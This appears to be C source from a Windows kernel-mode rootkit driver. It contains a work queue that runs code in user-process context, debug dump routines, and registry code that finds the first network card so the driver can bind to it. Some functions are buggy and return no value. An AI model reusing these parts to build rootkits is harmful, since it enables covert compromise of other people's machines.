#include "rk_driver.h"
#include "rk_utility.h"


LIST_ENTRY		ProcessContextWorkQueueHead;
ULONG			SystemProcessId=-1;

/* ----------------------------------------------------------------------------

  Process context work items functions...

  This functions, can help running code who need to be run in user mode process 
  context, to be executed safly.

  A function that have this requiremtns should create the working item using 

  CreateRunInProcessContextWorkItem(WORK_FUNCTION,PVOID), and by that create a work item 
  that will be run be other part of the RK.
  Then the function should call QueueWorkToRunInProcessContext() , in order to queue this 
  work item.

  Inside a place that run in passive level, and under process wich is not system process..
  one can (need?) to call the DequeuAndRun_RunInProcessContext_WorkItem() function.

  This function, will take care of running the queued code.

  The original function that need the code to run in passive, user process...
  should call WaitForWorkItem(). in order to wait until the code was executed.

-----------------------------------------------------------------------------*/
PPROCESS_CONTEXT_WORK_ITEM	CreateRunInProcessContextWorkItem(WORK_FUNCTION function,PVOID params){
	PPROCESS_CONTEXT_WORK_ITEM	pWorkItem;

	pWorkItem=ExAllocatePool(NonPagedPool,sizeof(PROCESS_CONTEXT_WORK_ITEM));
	if(!pWorkItem)
		return NULL;

	pWorkItem->function=function;
	pWorkItem->WorkInfo=params;

	KeInitializeEvent(&pWorkItem->evtWorkDone, NotificationEvent, 0);

	return pWorkItem;
}
NTSTATUS	QueueWorkToRunInProcessContext(PPROCESS_CONTEXT_WORK_ITEM pWorkItem){

	ExInterlockedInsertTailList(&ProcessContextWorkQueueHead,
								&pWorkItem->ListEntry,
								&WorkItemSpinLock);
}
NTSTATUS	DequeuAndRun_RunInProcessContext_WorkItem(){
	PLIST_ENTRY		pListEntry;
	PPROCESS_CONTEXT_WORK_ITEM	pWorkItem;


	// Wait until System Process ID will be determind...
	if(SystemProcessId==-1)
		return;

	// If not System process...
	if(PsGetCurrentProcessId()==SystemProcessId)
		return;
		

	pListEntry=ExInterlockedRemoveHeadList(&ProcessContextWorkQueueHead,&WorkItemSpinLock);

	if(pListEntry){
		pWorkItem=CONTAINING_RECORD(pListEntry,PROCESS_CONTEXT_WORK_ITEM,ListEntry);

		pWorkItem->function(pWorkItem->WorkInfo);

		// Mark that this  function was executed...
		KeSetEvent(&pWorkItem->evtWorkDone, 1, FALSE);
	}

}
NTSTATUS	WaitForWorkItem(PPROCESS_CONTEXT_WORK_ITEM pWorkItem){
	LARGE_INTEGER timeout;
	timeout.QuadPart = -(30 * 1000 * 10000);

	KeWaitForSingleObject(	
			&pWorkItem->evtWorkDone,
			Executive,
			KernelMode,
			FALSE,
			&timeout);
}


/* __________________________________________________________________________
 . Debugging functions.  These dump various data structures for debugging
 . and tracing purposes.  Use them.  Keep in mind you need a tool to view
 . these debug messages.  Download DbgView from www.sysinternals.com.  It rocks.
 . __________________________________________________________________________ */

/* reference */
#if 0
#define OBJ_INHERIT             0x00000002L
#define OBJ_PERMANENT           0x00000010L
#define OBJ_EXCLUSIVE           0x00000020L
#define OBJ_CASE_INSENSITIVE    0x00000040L
#define OBJ_OPENIF              0x00000080L
#define OBJ_OPENLINK            0x00000100L
#define OBJ_VALID_ATTRIBUTES    0x000001F2L
#endif

void DumpObjectAttributes(POBJECT_ATTRIBUTES ObjectAttributes)
/* dump the contents of the struct */
{
	int rc;
	if (ObjectAttributes)
	{
		DbgPrint("--objectattribtues struct ptr 0x%x\n", ObjectAttributes);
		DbgPrint("-- LENGTH %d\n", ObjectAttributes->Length);
		DbgPrint("-- RootDirectory 0x%X\n", ObjectAttributes->RootDirectory);
		if(ObjectAttributes->RootDirectory != 0) 
		{
				char ParentDirectory[1024];
				PUNICODE_STRING Parent=NULL;
                PVOID Object;

				ParentDirectory[0]='\0';
                Parent=(PUNICODE_STRING)ParentDirectory;
                rc=ObReferenceObjectByHandle(ObjectAttributes->RootDirectory,
                                             0,
                                             0,
                                             KernelMode,
                                             &Object,
                                             NULL);
                if (rc==STATUS_SUCCESS) {
                        extern NTSTATUS ObQueryNameString(void *, void *, int size,
                                                          int *);
                        int BytesReturned;

                        rc=ObQueryNameString(Object,
                                          ParentDirectory,
                                          sizeof(ParentDirectory),
                                          &BytesReturned);
                        ObDereferenceObject(Object);

                        if (rc!=STATUS_SUCCESS)
                                RtlInitUnicodeString(Parent, L"Unknown\\");
                } else {
                                RtlInitUnicodeString(Parent, L"Unknown\\");
                }
			DbgPrint("-- -- : Filename = %S%S%S\n", Parent?Parent->Buffer:L"",
                        Parent?L"\\":L"", ObjectAttributes->ObjectName->Buffer);
		}
		
		DbgPrint("-- ObjectName 0x%X\n", ObjectAttributes->ObjectName);
		if(ObjectAttributes->ObjectName)
		{
			DbgPrint("-- -- %S\n", ObjectAttributes->ObjectName->Buffer);
		}

		DbgPrint("-- Attributes 0x%X\n", ObjectAttributes->Attributes);
		DbgPrint("-- SecurityDescriptor 0x%X\n", ObjectAttributes->SecurityDescriptor);
		DbgPrint("-- SecurityQualityOfService 0x%X\n", ObjectAttributes->SecurityQualityOfService);
	}
	else
	{
		DbgPrint("--objectattributes struct NULL ptr.\n");
	}
}

void DumpContext(PCONTEXT pContext)
{
	/* dump context */
	if(pContext)
	{
		DbgPrint("ContextFlags 0x%X\n", pContext->ContextFlags);
		DbgPrint("Eip 0x%X\n", pContext->Eip);
		DbgPrint("Esp 0x%X\n", pContext->Esp);
		if(pContext->ContextFlags == 0x10007) /* CONTEXT_FULL */
		{
			

			DbgPrint("SEGMENT SegGs 0x%X\n", pContext->SegGs);
			DbgPrint("SEGMENT SegFs 0x%X\n", pContext->SegFs);
			DbgPrint("SEGMENT SegEs 0x%X\n", pContext->SegEs);
			DbgPrint("SEGMENT SegDs 0x%X\n", pContext->SegDs);
			
			DbgPrint("INTEGER Edi 0x%X\n", pContext->Edi);
			DbgPrint("INTEGER Esi 0x%X\n", pContext->Esi);
			DbgPrint("INTEGER Ebx 0x%X\n", pContext->Ebx);
			DbgPrint("INTEGER Edx 0x%X\n", pContext->Edx);
			DbgPrint("INTEGER Ecx 0x%X\n", pContext->Ecx);
			DbgPrint("INTEGER Eax 0x%X\n", pContext->Eax);
			
			DbgPrint("CONTROL Ebp 0x%X\n", pContext->Ebp);
			DbgPrint("CONTROL Eip 0x%X\n", pContext->Eip);
			DbgPrint("CONTROL SegCs 0x%X\n", pContext->SegCs);
			DbgPrint("CONTROL EFlags 0x%X\n", pContext->EFlags);
			DbgPrint("CONTROL Esp 0x%X\n", pContext->Esp);
			DbgPrint("CONTROL SegSs 0x%X\n", pContext->SegSs);
		}
	}
}


/* this is major work just to enum a subkey value */
NTSTATUS 
EnumSubkeys( 
	IN   PWSTR							  theRegistryPath,
    IN   PUNICODE_STRING                  theStringP 
)
{ 
	//----------------------------------------------------
	// for opening parent key
    HANDLE hKey;
    OBJECT_ATTRIBUTES oa; 
    NTSTATUS Status;  
	UNICODE_STRING ParentPath;
    
	// for enumerating a subkey
	KEY_BASIC_INFORMATION Info; 
    PKEY_BASIC_INFORMATION pInfo; 
    ULONG ResultLength; 
    ULONG Size; 
    PWSTR Position; 
    PWSTR FullName; 

	// for value query
	RTL_QUERY_REGISTRY_TABLE aParamTable[2];
	//----------------------------------------------------
	DbgPrint("rootkit: entered EnumSubkeys()\n");
__try
{
	RtlInitUnicodeString(&ParentPath, theRegistryPath);
	
    /* 
    **  First try opening this key 
    */ 
    InitializeObjectAttributes(&oa, 
                               &ParentPath, 
                               OBJ_CASE_INSENSITIVE, 
                               NULL, 
                               (PSECURITY_DESCRIPTOR)NULL); 
    Status = ZwOpenKey(&hKey, 
                       KEY_READ, 
                       &oa); 
 
    if (!NT_SUCCESS(Status)) { 
        return Status; 
    } 
 
    
    /* 
    **  First find the length of the subkey data 
    */ 
    Status = ZwEnumerateKey(hKey, 
                            0, /* index of zero */ 
                            KeyBasicInformation, 
                            &Info, 
                            sizeof(Info), 
                            &ResultLength); 

    if (Status == STATUS_NO_MORE_ENTRIES || NT_ERROR(Status)) { 
        return Status;  
    } 

    Size = Info.NameLength + FIELD_OFFSET(KEY_BASIC_INFORMATION, Name[0]); 

    pInfo = (PKEY_BASIC_INFORMATION) 
            ExAllocatePool(PagedPool, Size); 

    if (pInfo == NULL) { 
        Status = STATUS_INSUFFICIENT_RESOURCES; 
        return Status; 
    }
	
	/* 
    **  Now enumerate the first subkey
    */ 
    Status = ZwEnumerateKey(hKey, 
                            0, 
                            KeyBasicInformation, 
                            pInfo, 
                            Size, 
                            &ResultLength); 
    if (!NT_SUCCESS(Status)) { 
        ExFreePool((PVOID)pInfo); 
        return Status; 
    } 

    if (Size != ResultLength) { 
        ExFreePool((PVOID)pInfo); 
        Status = STATUS_INTERNAL_ERROR; 
        return Status; 
    } 

    /* 
    **  Generate the fully expanded name and query values. 
    */ 
    FullName = ExAllocatePool(PagedPool, 
                              ParentPath.Length + 
                              sizeof(WCHAR) +       // '\' 
                              pInfo->NameLength + sizeof(UNICODE_NULL)); 
    if (FullName == NULL) { 
        ExFreePool((PVOID)pInfo); 
        return STATUS_INSUFFICIENT_RESOURCES; 
    } 
    RtlCopyMemory((PVOID)FullName, 
                  (PVOID)ParentPath.Buffer, 
                  ParentPath.Length); 
    Position = FullName + ParentPath.Length / sizeof(WCHAR); 
    Position[0] = '\\'; 
    Position++;  
    RtlCopyMemory((PVOID)Position, 
                  (PVOID)pInfo->Name, 
                  pInfo->NameLength); 
    Position += pInfo->NameLength / sizeof(WCHAR); 
    /* 
    **  Null terminate 
    */ 
    Position[0] = UNICODE_NULL; 
    ExFreePool((PVOID)pInfo); 

	
	/*
	** Get the value data for binding
	**
	*/
	RtlZeroMemory( &aParamTable[0], sizeof(aParamTable) );

	aParamTable[0].Flags = RTL_QUERY_REGISTRY_DIRECT |
						   RTL_QUERY_REGISTRY_REQUIRED;
	aParamTable[0].Name  = L"ServiceName";
	aParamTable[0].EntryContext = theStringP; /* will be allocated */
	
	// because we are using required & direct, we don't need to set defaults
	// IMPORTANT note, the last entry is ALL NULL, required by call to know when it's done.  Don't forget!
	Status=RtlQueryRegistryValues(	RTL_REGISTRY_ABSOLUTE | RTL_REGISTRY_OPTIONAL,
               						FullName, 
               						&aParamTable[0],
               						NULL,
              						NULL );
	ExFreePool((PVOID)FullName); 
	return(Status);
}
__except(EXCEPTION_EXECUTE_HANDLER)
{
	DbgPrint("rootkit: Exception in EnumSubkeys().  Unknown error.\n");
}
return STATUS_UNSUCCESSFUL;
} 
 

  
/* ___________________________________________________________________________
 . This code reads the registry to determine the name of the Network Interface
 . Card.  It grabs the first registered name, regardless of how many
 . are present.  It would be better to bind to all of them - but for 
 . simplicity - we are only binding to the first.
 . ___________________________________________________________________________ */
NTSTATUS ReadRegistry( IN  PUNICODE_STRING theBindingName ) {
    NTSTATUS   aStatus;
	UNICODE_STRING aString;
    	
	//__asm int 3

	DbgPrint("ROOTKIT: ReadRegistry called\n");

__try
{
	aString.Length = 0;
	aString.Buffer = ExAllocatePool( PagedPool, MAX_PATH_LENGTH ); /* free me */
	aString.MaximumLength = MAX_PATH_LENGTH;
	RtlZeroMemory(aString.Buffer, MAX_PATH_LENGTH);


	aStatus = EnumSubkeys( L"\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NetworkCards", 
						   &aString );
               						
	if(!NT_SUCCESS(aStatus)){
		DbgPrint(("rootkit: RtlQueryRegistryValues failed Code = 0x%0x\n", aStatus));
	}
	else{
		RtlAppendUnicodeToString(theBindingName, L"\\Device\\");
		RtlAppendUnicodeStringToString(theBindingName, &aString);
		ExFreePool(aString.Buffer);
		return aStatus; /* were good */
	}
    return aStatus; /* last error */
}
__except(EXCEPTION_EXECUTE_HANDLER)
{
	DbgPrint("rootkit: Exception occured in ReadRegistry().  Unknown error. \n");
}
return STATUS_UNSUCCESSFUL;
}
